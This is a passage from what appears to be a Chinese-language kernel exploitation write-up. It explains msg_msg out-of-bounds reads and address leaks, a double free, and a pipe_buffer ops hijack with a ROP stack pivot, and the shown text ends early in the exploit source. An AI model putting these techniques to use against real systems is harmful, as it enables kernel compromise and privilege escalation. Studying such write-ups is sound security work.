class="comment">//...</span></span><br></pre></td></tr></table></figure><p>阅读源码可以看到其会判断生成的msg_msg的结构体是否小于DATALEN_MSG也就是</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DATALEN_MSG((size_t)PAGE_SIZE-sizeof(struct msg_msg))</span></span><br></pre></td></tr></table></figure><p>如果小于则直接生产一个msg_msg结构体，如果大于会生成另外一个msg_msgseg结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct msg_msg *<span class="title">alloc_msg</span><span class="params">(<span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> **<span class="title">pseg</span>;</span></span><br><span class="line">  <span class="keyword">size_t</span> alen;</span><br><span class="line"></span><br><span class="line">  alen = min(len, DATALEN_MSG);</span><br><span class="line">  msg = kmalloc(<span class="keyword">sizeof</span>(*msg) + alen, GFP_KERNEL_ACCOUNT);</span><br><span class="line">  <span class="keyword">if</span> (msg == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  msg-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">  msg-&gt;security = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  len -= alen;</span><br><span class="line">  pseg = &amp;msg-&gt;next;</span><br><span class="line">  <span class="keyword">while</span> (len &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">seg</span>;</span></span><br><span class="line"></span><br><span class="line">    cond_resched();</span><br><span class="line"></span><br><span class="line">    alen = min(len, DATALEN_SEG);</span><br><span class="line">    seg = kmalloc(<span class="keyword">sizeof</span>(*seg) + alen, GFP_KERNEL_ACCOUNT);</span><br><span class="line">    <span class="keyword">if</span> (seg == <span class="literal">NULL</span>)</span><br><span class="line">      <span class="keyword">goto</span> out_err;</span><br><span class="line">    *pseg = seg;</span><br><span class="line">    seg-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    pseg = &amp;seg-&gt;next;</span><br><span class="line">    len -= alen;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> msg;</span><br><span class="line"></span><br><span class="line">  out_err:</span><br><span class="line">  free_msg(msg);</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>总结上述的生成方式也就是：</p><ul><li>对于大小在【一个页面再减掉作为 header 的 msg_msg 的 size】范围内的数据而言，内核仅会分配一个 size + header size 大小的 object（通过 kmalloc），其前 0x30 大小的部分存放 msg_msg 这一 header，剩余部分用以存放用户数据</li><li>对于大小超出【一个页面再减掉作为 header 的 msg_msg 的 size】范围的数据而言，其会额外生成 <code>msg_msgseg</code> 结构体来存放用户数据，通过 kmalloc 分配，大小为剩余未拷贝的用户数据大小加上 next 指针；该结构体与 msg_msg 的 next 成员形成一个<strong>单向链表</strong>，其前 8 字节存放指向下一个 msg_msgseg 的指针，若无则为 NULL</li></ul><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/5IcVxRaFQtg3HCW.png"                                     ></p><p>有了上述依据我们不难想到，我们可以通过修改m_ts的值来实现堆上的越界数据读取，并且我们可以通过next指针来实现任意地址数据泄漏。但是这里存在这样一个问题，当我们使用msgrcv来读取数据时会调用list_del函数:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">long</span> <span class="title">do_msgrcv</span><span class="params">(<span class="keyword">int</span> msqid, <span class="keyword">void</span> __user *buf, <span class="keyword">size_t</span> bufsz, <span class="keyword">long</span> msgtyp, <span class="keyword">int</span> msgflg,</span></span></span><br><span class="line"><span class="params"><span class="function">                      <span class="keyword">long</span> (*msg_handler)(<span class="keyword">void</span> __user *, struct msg_msg *, <span class="keyword">size_t</span>))</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line">  list_del(&amp;msg-&gt;m_list);</span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line">  <span class="keyword">goto</span> out_unlock0;</span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line">  out_unlock0:</span><br><span class="line">  ipc_unlock_object(&amp;msq-&gt;q_perm);</span><br><span class="line">  wake_up_q(&amp;wake_q);</span><br><span class="line">  out_unlock1:</span><br><span class="line">  rcu_read_unlock();</span><br><span class="line">  <span class="keyword">if</span> (IS_ERR(msg)) &#123;</span><br><span class="line">    free_copy(copy);</span><br><span class="line">    <span class="keyword">return</span> PTR_ERR(msg);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  bufsz = msg_handler(buf, msg, bufsz);</span><br><span class="line">  free_msg(msg);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> bufsz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">list_del</span><span class="params">(struct list_head *entry)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">__list_del_entry(entry);</span><br><span class="line">entry-&gt;next = LIST_POISON1;</span><br><span class="line">entry-&gt;prev = LIST_POISON2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到在list_del函数内部是会进行指针赋值的，所以如果存在非法地址的应用会造成panic，但是就目前为止我们还不知道任何内核地址，所以造成panic时肯定的。因此，为了绕过这一函数，并且可以读取内容我们需要修改msgrcv函数的标识位为<code>MSG_COPY</code>则<strong>内核会将 message 拷贝一份后再拷贝到用户空间，原双向链表中的 message 并不会被 unlink</strong>，从而我们便可以多次重复地读取同一个 <code>msg_msg</code> 结构体中数据:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (msgflg &amp; MSG_COPY) &#123;</span><br><span class="line">  <span class="keyword">if</span> ((msgflg &amp; MSG_EXCEPT) || !(msgflg &amp; IPC_NOWAIT))</span><br><span class="line">    <span class="keyword">return</span> -EINVAL;</span><br><span class="line">  copy = prepare_copy(buf, <span class="keyword">min_t</span>(<span class="keyword">size_t</span>, bufsz, ns-&gt;msg_ctlmax));</span><br><span class="line">  <span class="keyword">if</span> (IS_ERR(copy))</span><br><span class="line">    <span class="keyword">return</span> PTR_ERR(copy);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If we are copying, then do not unlink message and do</span></span><br><span class="line"><span class="comment"> * not update queue parameters.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">  <span class="keyword">if</span> (msgflg &amp; MSG_COPY) &#123;</span><br><span class="line">    msg = copy_msg(msg, copy);</span><br><span class="line">    <span class="keyword">goto</span> out_unlock0;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//...</span></span><br></pre></td></tr></table></figure><p>接下来我们考虑越界读取的详细过程，我们首先可以利用 setxattr 修改 msg_msg 的 <code>next</code> 指针为 NULL、将其 <code>m_ts</code> 改为 <code>0x1000 - 0x30</code>（在 next 指针为 NULL 的情况下，一个 msg_msg 结构体最大占用一张内存页的大小），从而越界读出内核堆上数据。但是接下来我们需要进行地址搜索，所以需要搜索的地址为合法的，也就是next指针必须是合法的，如果next为非法指针则会引起kernel panic。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct msg_msg *<span class="title">copy_msg</span><span class="params">(struct msg_msg *src, struct msg_msg *dst)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">dst_pseg</span>, *<span class="title">src_pseg</span>;</span></span><br><span class="line">  <span class="keyword">size_t</span> len = src-&gt;m_ts;</span><br><span class="line">  <span class="keyword">size_t</span> alen;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (src-&gt;m_ts &gt; dst-&gt;m_ts)</span><br><span class="line">    <span class="keyword">return</span> ERR_PTR(-EINVAL);</span><br><span class="line"></span><br><span class="line">  alen = min(len, DATALEN_MSG);</span><br><span class="line">  <span class="built_in">memcpy</span>(dst + <span class="number">1</span>, src + <span class="number">1</span>, alen);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (dst_pseg = dst-&gt;next, src_pseg = src-&gt;next;</span><br><span class="line">       src_pseg != <span class="literal">NULL</span>;</span><br><span class="line">       dst_pseg = dst_pseg-&gt;next, src_pseg = src_pseg-&gt;next) &#123;</span><br><span class="line"></span><br><span class="line">    len -= alen;</span><br><span class="line">    alen = min(len, DATALEN_SEG);</span><br><span class="line">    <span class="built_in">memcpy</span>(dst_pseg + <span class="number">1</span>, src_pseg + <span class="number">1</span>, alen);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  dst-&gt;m_type = src-&gt;m_type;</span><br><span class="line">  dst-&gt;m_ts = src-&gt;m_ts;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> dst;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以我们需要确保获得一个合法的堆上地址进行搜索的同时确保我们所构造的next 链上皆为合法地址，并以 NULL 结尾，如何找到这样一个地址？</p><p>总所周知，slub 会向 buddy system 申请一张或多张连续内存页，将其分割为指定大小的 object 之后再返还给 kmalloc 的 caller，对于大小为 1024 的 object，其每次申请的连续内存页为四张，分为 16 个 object</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cat /proc/slabinfo </span></span><br><span class="line">slabinfo - version: 2.1</span><br><span class="line"><span class="comment"># name            &lt;active_objs&gt; &lt;num_objs&gt; &lt;objsize&gt; &lt;objperslab&gt; &lt;pagesperslab&gt; : tunables &lt;limit&gt; &lt;batchcount&gt; &lt;sharedfactor&gt; : slabdata &lt;active_slabs&gt; &lt;num_slabs&gt; &lt;sharedavail&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ...</span></span><br><span class="line"></span><br><span class="line">kmalloc-1k           464    464   1024   16    4 : tunables    0    0    0 : slabdata     29     29      0</span><br><span class="line"></span><br><span class="line"><span class="comment"># ...</span></span><br></pre></td></tr></table></figure><p>如果是我们分配多个大小同为 1024 的 msg_msg 结构体，则其很容易落在地址连续的 4 张内存页上，此时若是我们从其中一个 msg_msg 结构体向后进行越界读，则很容易读取到其他的 msg_msg 结构体的数据，其 m_list 成员可以帮助我们泄露出一个堆上地址</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/sD9xtpaHrQ2uneZ.png"                                     ></p><p>在前面这个链表中可以看出来是互相指向的，这里调试可以看到m_list的成员是只想msg_queue结构体的q_message域，而msg_queue结构体的q_message域也是只想msg_msg结构体的m_list域。</p><p>此时按照常规思路就是首先泄漏出m_list结构内部的msg_queue结构体的地址，然后在msg_queue结构体向下进行搜索。虽然这种可以但是在后续进行ROP时会出现问题，这里先不提了后面再做解释，目前需要注意的是这里还是需要泄漏出msg_msg结构体的地址。</p><p>虽然目前来看我们已经通过越界数据读取获得了一个堆地址也就是msg_queue地址，但是我们在读取过程中是将msg_queue结构体当作msg_msgseg结构体来进行阅读，所以我们需要保证他的next指针为NULL。不过幸运的是，<code>msg_queue-&gt;q_lrpid</code> 在未使用 msgrcv 接收消息时为 NULL，该成员在 q_message 成员向前的 8 字节处，因此我们可以将 next 指针指向这个位置。</p><p>到目前为止我们所有存在的问题基本都已经解决了，已经可以开始进行内存搜索了。不过这里泄漏出来的kernel text地址是不一定的，原作者使用的办法是写一个字典来进行匹配，我这里也属实没有更好的解决办法了，所以继续延用了原作者的办法。</p><h2 id="pipe-buffer劫持执行流"><a href="#pipe-buffer劫持执行流" class="headerlink" title="pipe_buffer劫持执行流"></a>pipe_buffer劫持执行流</h2><h3 id="构造double-free"><a href="#构造double-free" class="headerlink" title="构造double free"></a>构造double free</h3><p>这里原作者阐述了为什么不使用修改cred结构体，但是就目前来说我们想要实现任意地址写的话需要控制free堆块的类似fd指针的东西，所以我们需要使用到userfaultfd技术但是内核版本 5.11 起 userfaultfd 系统调用被限制为 root 权限才能使用，所以这条路基本是寄了。所以这里还是选择常规的劫持执行流。</p><p>因为在kernel中堆检测类似于fast bin的检测，所以我们需要形成<code>A-&gt;B-&gt;A</code>这样的结构。并且，我们在形成double free的方式是需要进行msgrcv来实现的，所以我们需要在free之前恢复结构。</p><h3 id="劫持RIP"><a href="#劫持RIP" class="headerlink" title="劫持RIP"></a>劫持RIP</h3><p><code>pipe_buffer</code> 这一结构体，当我们创建一个管道时，在内核中会生成数个连续的该结构体，申请的内存总大小刚好会让内核从 kmalloc-1k 中取出一个 object</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *struct pipe_buffer - a linux kernel pipe buffer</span></span><br><span class="line"><span class="comment"> *@page: the page containing the data for the pipe buffer</span></span><br><span class="line"><span class="comment"> *@offset: offset of data inside the @page</span></span><br><span class="line"><span class="comment"> *@len: length of data inside the @page</span></span><br><span class="line"><span class="comment"> *@ops: operations associated with this buffer. See @pipe_buf_operations.</span></span><br><span class="line"><span class="comment"> *@flags: pipe buffer flags. See above.</span></span><br><span class="line"><span class="comment"> *@private: private data owned by the ops.</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> offset, len;</span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> flags;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">private</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>而当我们关闭了管道的两端时，会触发 <code>pipe_buffer-&gt;pipe_buffer_operations-&gt;release</code> 这一指针，因此我们只需要劫持其函数表即可，劫持的位置也很清晰：因为我们最终使用的setxattr函数来进行修改pipe_buffer的内容的，所以这里就体会到了我前面所说的为什么要泄漏msg_msg的地址了，我们需要将ops劫持到他自身。并在上面写上rop进行栈迁移，因为经过调试发现执行gagdte的时候rsi 寄存器指向 pipe_buffer，因此笔者选择了一条 <code>push rsi ; pop rsp ; pop 4 vals ; ret</code> 的 gadget 完成栈迁移</p><h3 id="综上，exp"><a href="#综上，exp" class="headerlink" title="综上，exp"></a>综上，exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;net/if.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MSG_COPY 040000</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">kernelLeakQuery</span><span class="params">(<span class="keyword">size_t</span> kernel_text_leak)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> kernel_offset = <span class="number">0xdeadbeef</span>;</span><br><span class="line">    <span class="keyword">switch</span> (kernel_text_leak &amp; <span class="number">0xfff</span>)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x6e9</span>:</span><br><span class="line">        kernel_offset = kernel_text_leak - <span 